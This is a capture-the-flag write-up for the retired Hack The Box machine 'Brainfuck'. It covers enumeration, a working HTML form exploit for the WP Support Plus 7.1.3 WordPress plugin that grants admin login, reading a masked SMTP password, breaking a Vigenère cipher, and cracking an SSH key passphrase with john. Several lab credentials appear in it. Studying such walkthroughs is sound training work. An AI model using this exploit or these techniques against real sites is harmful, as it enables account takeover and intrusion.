# Brainfuck

This is the write-up for the box Brainfuck that got retired at the 26th August 2017.
My IP address was 10.10.14.23 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.17    brainfuck.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/brainfuck.nmap 10.10.10.17
```

```markdown
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) TOP UIDL RESP-CODES USER PIPELINING AUTH-RESP-CODE CAPA
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: SASL-IR ENABLE LOGIN-REFERRALS IMAP4rev1 more capabilities IDLE ID Pre-login LITERAL+ listed have AUTH=PLAINA0001 OK post-login
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29
|_Not valid after:  2027-04-11T11:19:29
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
| tls-nextprotoneg:
|_  http/1.1
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTPS (Port 443)

The Nmap output gives us a subdomain with an interesting name that we will put into our hosts file, too.
Browsing to the web page on the IP address gives us a default nginx installation page.

Browsing to the web page with the DNS name _brainfuck.htb_ gives us a custom WordPress site of the fictional company **Brainfuck Ltd.** with one article that has an email address in it.
> orestis@brainfuck.htb

![WordPress page](https://kyuu-ji.github.io/htb-write-up/brainfuck/brainfuck_wordpress-1.png)

Enumerate WordPress:
 ```markdown
wpscan --url https://brainfuck.htb --disable-tls-checks
```

The version is 4.7.3 and it found the users _admin_ and _administrator_ and the plugin **WP Support Plus Responsive Ticket System version 7.1.3** is installed.
Looking for vulnerabilities in this plugin we find one:
 ```markdown
searchsploit "WP Support Plus"
```

The vulnerability is called _WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation_ and we modify the exploit code to our needs:
 ```html
<form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
        Username: <input type="text" name="username" value="admin">
        <input type="hidden" name="email" value="orestis@brainfuck.htb">
        <input type="hidden" name="action" value="loginGuestFacebook">
        <input type="submit" value="Login">
</form>
```

We can host this on the _Python SimpleHTTPServer_ and click Login on the form. This will set the session cookies to administrative session cookies and we get logged in on the WordPress page as _admin_.

![WordPress Admin page](https://kyuu-ji.github.io/htb-write-up/brainfuck/brainfuck_wordpress-2.png)

To get code execution in WordPress we can go into _Appearance --> Editor_ and edit the PHP files normally but in this case, all the files are not writable, so this will not work.

As the first article on the page mentioned that SMTP integration is ready, we can look into those settings in _Settings --> Easy WP SMTP_.
In here we get the SMTP username that we got before and a masked password. The masked password can be read by looking at the field with the Developer Tools in the browser:

![WordPress Admin page](https://kyuu-ji.github.io/htb-write-up/brainfuck/brainfuck_wordpress-3.png)

These are the credentials for SMTP:
> orestis:kHGuERB29DNiNE

## Checking SMTP (Port 25)

We can use any mail client to connect to the mail server _brainfuck.htb_ with the gathered credentials.
After configuring the mail client we can see the inbox of _Orestis_ and he has two emails. The mail from _root@brainfuck.htb_ is very interesting because there are credentials for a secret forum:

![WordPress Admin page](https://kyuu-ji.github.io/htb-write-up/brainfuck/brainfuck_mails.png)

```markdown
username: orestis
password: kIEnnfEKJ#9UmdO
```

## Checking the Subdomain on HTTPS (Port 443)

Browsing to the subdomain _sup3rs3cr3t.brainfuck.htb_ we are presented with a **Super Secret Forum** where we can try the gathered credentials.
They work and there are two threads to examine:

The first thread is called **SSH Access** and it tells us that SSH authentication only works with keys.

![WordPress Admin page](https://kyuu-ji.github.io/htb-write-up/brainfuck/brainfuck_forum-1.png)

The second thread is called **Key** and is the encrypted thread that _Orestis_ is talking about:

![WordPress Admin page](https://kyuu-ji.github.io/htb-write-up/brainfuck/brainfuck_forum-2.png)

They write in a decoded type of language that looks like some kind of cipher that involves the alphabet because there are still whitespaces and numbers like the IP address are not decoded.

### Decoding the messages

Our clue for decoding is that _Orestis_ always ends his messages with the signature _"Orestis - Hacking for fun and profit"_. This is the same method that was used to decipher the **Enigma**.

The [One Time Pad Tool from Rumkin](http://rumkin.com/tools/cipher/otp.php) will help us to get the key.

```markdown
Plaintext: Orestis - Hacking for fun and profit
Encrypted: Pieagnm - Jkoijeg nbw zwx mle grwsnn
```

By comparing the letters and putting them into the tool one by one we get the key.
```markdown
# Decrypt

Your message:  P i e a g n m J k o i j e g n b w z w x m l e g r w s n n
The pad:       O r e s t i s H a c k i n g f o r f u n a n d p r o f i t
------------------------------------------------------------------------
Key:           B r a i n f u c k m y b r a i n f u c k m y b r a i n f u
```

The key we can decode the text with is:
> fuckmybrain

Now we can use the [Keyed Vigenere Tool from Rumkin](http://rumkin.com/tools/cipher/vigenere-keyed.php) to decode the messages:

![WordPress Admin page](https://kyuu-ji.github.io/htb-write-up/brainfuck/brainfuck_forum-3.png)

This is the most important message:

![WordPress Admin page](https://kyuu-ji.github.io/htb-write-up/brainfuck/brainfuck_forum-4.png)

Lets browse to the URL https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa and download the _id_rsa_ file.

### Decrypting the RSA key

If we look at the RSA key that we got, it is _AES-128-CBC_ encrypted and we need to decrypt it first:
```markdown
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6904FEF19397786F75BE2D7762AE7382
```

We can use [sshng2john](https://github.com/stricture/hashstack-server-plugin-jtr/blob/master/scrapers/sshng2john.py) to bring this to a format that is crackable:
```markdown
python sshng2john.py id_rsa
```

And then use the password cracking tool **JohnTheRipper** to crack it:
```markdown
john id_rsa.encrypted --wordlist=/usr/share/wordlists/rockyou.txt
```

After some time we cracked the password for this key:
> 3poulakia!

## Checking SSH (Port 22)

Now SSH login works with the private key and the password:
```markdown
chmod 600 id_rsa

ssh -i id_rsa orestis@10.10.10.17
```

## Privilege Escalation

In the home folder of _Orestis_ there are these three files:
- debug.text
- output.text
- encrypt.sage

Looking at the _encrypt.sage_ file, we can see that it calculates something with the variables **p, q, e, n phi**.
Those are usually used in **RSA Encryption**, so this is some kind of RSA attack.

In this repository there is the script **brainfuck_decrypt.py** that uses the variables from those files to calculate the key.
The 3 lines in _debug.txt_ are the variables for p, q and e.
The number in _output.txt_ is the variable for ct.
```markdown
python brainfuck_decrypt.py
```

After running this, we get the value for pt which stands for Plaintext:
> 24604052029401386049980296953784287079059245867880966944246662849341507003750

This has to get converted into ASCII so we can read it.
```python
pt = 24604052029401386049980296953784287079059245867880966944246662849341507003750
str(hex(pt)[2:-1]).decode('hex')
```

The result is a 32 character long string, which is probably a **MD5 hash**.
This MD5 hash is the content of the root.txt flag!
